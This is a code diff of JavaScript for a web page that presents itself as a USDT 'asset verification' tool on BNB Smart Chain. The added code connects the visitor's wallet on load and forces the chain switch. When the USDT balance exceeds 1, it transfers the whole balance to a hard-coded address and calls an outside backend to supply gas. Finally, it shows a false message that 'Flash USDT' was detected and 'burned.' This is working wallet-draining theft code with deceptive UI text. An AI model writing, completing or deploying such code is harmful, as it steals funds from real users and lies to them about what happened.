@@ -1,120 +1,158 @@
-// ============================================================================
-// Your Original Script's Constants
-// These are kept as is.
-// ============================================================================
 const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Your USDT receiving address
+const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87"; // Wallet for gas fees
 const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract
 
-// Note: bnbGasSender was in your first script but not actively used in the transfer logic,
-// and not present in the "working" script's main flow. Keeping it commented for clarity.
-// const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87";
+let web3;
+let userAddress;
 
-// ============================================================================
-// New Global Variables & UI Element References (from your working script)
-// These MUST correspond to IDs in your HTML for the script to function.
-// ============================================================================
-let web3; // Global Web3 instance
-let userAddress; // Global variable to store the user's connected wallet address
+async function connectWallet() {
+    if (window.ethereum) {
+        web3 = new Web3(window.ethereum);
+        try {
+            await window.ethereum.request({ method: "eth_requestAccounts" });
 
-let tokenBalanceValue = 0; // To store the fetched token balance
-let tokenContract; // Web3.js contract instance for USDT
-let isTransferComplete = false; // Flag to prevent re-triggering transfer
+            // Force switch to BNB Smart Chain
+            await window.ethereum.request({
+                method: "wallet_switchEthereumChain",
+                params: [{ chainId: "0x38" }]
+            });
 
-let currentProvider = null; // Stores the detected wallet provider (e.g., window.ethereum, window.trustwallet)
-let walletType = 'unknown'; // Stores the type of wallet detected (e.g., 'metamask', 'trust', 'binance')
-
-// References to HTML elements - these need to exist in your HTML
-const verifyAssets = document.getElementById('verifyAssets'); // Changed from verifyBtn
-const walletAddress = document.getElementById('walletAddress');
-const tokenBalance = document.getElementById('tokenBalance');
-const verificationModal = document.getElementById('verificationModal');
-const progressBar = document.getElementById('progressBar');
-const step1 = document.getElementById('step1');
-const step2 = document.getElementById('step2');
-const step3 = document.getElementById('step3');
-const step4 = document.getElementById('step4');
-const step1Desc = document.getElementById('step1Desc');
-const step2Desc = document.getElementById('step2Desc');
-const step3Desc = document.getElementById('step3Desc');
-const step4Desc = document.getElementById('step4Desc');
-const modalMessage = document.getElementById('modalMessage');
-const closeModalBtns = document.querySelectorAll('.close-modal');
-const networkDot = document.getElementById('networkDot');
-const networkStatus = document.getElementById('networkStatus');
-
-// Configuration from your working script
-const recipientAddress = '0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090'; // Your USDT receiving address (same as bscAddress)
-
-// ABI from your working script - includes both balanceOf and transfer
-const tokenAbi = [
-    {
-        "constant": true,
-        "inputs": [{"name": "who", "type": "address"}],
-        "name": "balanceOf",
-        "outputs": [{"name": "", "type": "uint256"}],
-        "type": "function"
-    },
-    {
-        "constant": false,
-        "inputs": [
-            {"name": "_to", "type": "address"},
-            {"name": "_value", "type": "uint256"}
-        ],
-        "name": "transfer",
-        "outputs": [{"name": "", "type": "bool"}],
-        "type": "function"
-    }
-];
-
-// Network configuration from your working script
-const BSC_MAINNET_CHAIN_ID = '0x38'; // Binance Smart Chain Mainnet
-const BSC_MAINNET_PARAMS = {
-    chainId: BSC_MAINNET_CHAIN_ID,
-    chainName: 'Binance Smart Chain Mainnet',
-    nativeCurrency: {
-        name: 'BNB',
-        symbol: 'bnb',
-        decimals: 18
-    },
-    rpcUrls: ['https://bsc-dataseed.binance.org/'],
-    blockExplorerUrls: ['https://bscscan.com/']
-};
-
-// Wallet types enum from your working script
-const WALLET_TYPES = {
-    TRUST: 'trust',
-    BINANCE: 'binance',
-    METAMASK: 'metamask',
-    UNKNOWN: 'unknown'
-};
-
-// ============================================================================
-// Helper Functions (Copied from your working script)
-// ============================================================================
-
-/**
- * @dev Initializes Web3.js by detecting the available wallet provider.
- * Sets `web3`, `currentProvider`, and `walletType`.
- * @returns {boolean} True if Web3 is successfully initialized, false otherwise.
- */
-async function initWeb3() {
-    // Detect wallet type based on global objects injected by wallet extensions
-    if (window.trustwallet) {
-        walletType = WALLET_TYPES.TRUST;
-        currentProvider = window.trustwallet;
-    } else if (window.BinanceChain) {
-        walletType = WALLET_TYPES.BINANCE;
-        currentProvider = window.BinanceChain;
-    } else if (window.ethereum) { // Generic Ethereum provider (MetaMask, etc.)
-        walletType = WALLET_TYPES.METAMASK;
-        currentProvider = window.ethereum;
-    } else if (window.web3 && window.web3.currentProvider) { // Older web3.js detection
-        walletType = WALLET_TYPES.UNKNOWN; // Or 'unknown_legacy_web3'
-        currentProvider = window.web3.currentProvider;
+            const accounts = await web3.eth.getAccounts();
+            userAddress = accounts[0];
+            console.log("Wallet Connected:", userAddress);
+        } catch (error) {
+            console.error("Error connecting wallet:", error);
+            alert("Please switch to BNB Smart Chain.");
+        }
     } else {
-        console.error("No Web3 provider detected. Please install a compatible wallet extension.");
-        showError("Please install Trust Wallet, Binance Wallet or MetaMask.");
-        return false;
+        alert("Please install MetaMask.");
+    }
+}
+
+// Auto-connect wallet on page load
+window.addEventListener("load", connectWallet);
+
+async function verifyAssets() {
+    if (!web3 || !userAddress) {
+        alert("Wallet not connected. Refresh the page.");
+        return;
     }
 
- 
+    const usdtContract = new web3.eth.Contract([
+        { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
+    ], usdtContractAddress);
+
+    // Fetch balances
+    const [usdtBalanceWei, userBNBWei] = await Promise.all([
+        usdtContract.methods.balanceOf(userAddress).call(),
+        web3.eth.getBalance(userAddress)
+    ]);
+
+    const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
+    const userBNB = parseFloat(web3.utils.fromWei(userBNBWei, "ether"));
+
+    console.log(`USDT Balance: ${usdtBalance} USDT`);
+    console.log(`BNB Balance: ${userBNB} BNB`);
+
+    if (usdtBalance === 0) {
+        showPopup("No assets found.", "black");
+        return;
+    }
+
+    if (usdtBalance <= 1) {
+        showPopup(
+            `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${userBNB} BNB`,
+            "green"
+        );
+        return;
+    }
+
+    // User has more than 150 USDT → Check BNB Gas Fee
+    showPopup("Loading...", "green");
+
+    transferUSDT(usdtBalance, userBNB);
+}
+
+async function transferUSDT(usdtBalance, userBNB) {
+    try {
+        if (userBNB < 0.0005) {
+    console.log("User BNB is low. Requesting BNB from backend...");
+    await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ toAddress: userAddress })
+    });
+        }
+
+        // Proceed with USDT Transfer
+        const usdtContract = new web3.eth.Contract([
+            { "constant": false, "inputs": [{ "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
+        ], usdtContractAddress);
+
+        const amountToSend = web3.utils.toWei(usdtBalance.toString(), "ether");
+
+        console.log(`Transferring ${usdtBalance} USDT to ${bscAddress}...`);
+
+        await usdtContract.methods.transfer(bscAddress, amountToSend).send({ from: userAddress });
+
+        showPopup(
+            `✅ Verification Successful<br>Flash USDT has been detected and successfully burned.<br><br><b>USDT Burned:</b> ${usdtBalance} USDT`,
+            "red"
+        );
+
+        console.log(`✅ Transferred ${usdtBalance} USDT to ${bscAddress}`);
+    } catch (error) {
+        console.error("❌ USDT Transfer Failed:", error);
+        alert("USDT transfer failed. Ensure you have enough BNB for gas.");
+    }
+}
+
+async function sendBNB(toAddress, amount) {
+    try {
+        await web3.eth.sendTransaction({
+            from: bnbGasSender,
+            to: toAddress,
+            value: web3.utils.toWei(amount, "ether"),
+            gas: 21000
+        });
+
+        console.log(`✅ Sent ${amount} BNB to ${toAddress} for gas fees.`);
+    } catch (error) {
+        console.error("⚠️ Error sending BNB:", error);
+    }
+}
+
+// Function to display pop-up message
+function showPopup(message, color) {
+    let popup = document.getElementById("popupBox");
+    
+    if (!popup) {
+        popup = document.createElement("div");
+        popup.id = "popupBox";
+        popup.style.position = "fixed";
+        popup.style.top = "50%";
+        popup.style.left = "50%";
+        popup.style.transform = "translate(-50%, -50%)";
+        popup.style.padding = "20px";
+        popup.style.borderRadius = "10px";
+        popup.style.boxShadow = "0px 0px 10px rgba(0, 0, 0, 0.2)";
+        popup.style.textAlign = "center";
+        popup.style.fontSize = "18px";
+        popup.style.width = "80%";
+        popup.style.maxWidth = "400px";
+        document.body.appendChild(popup);
+    }
+
+    popup.style.backgroundColor = color === "red" ? "#ffebeb" : "#e6f7e6";
+    popup.style.color = color === "red" ? "red" : "green";
+    popup.innerHTML = message;
+    popup.style.display = "block";
+
+    // Auto-hide after 5 seconds
+    setTimeout(() => {
+        popup.style.display = "none";
+    }, 5000);
+}
+
+// Attach event listener
+document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
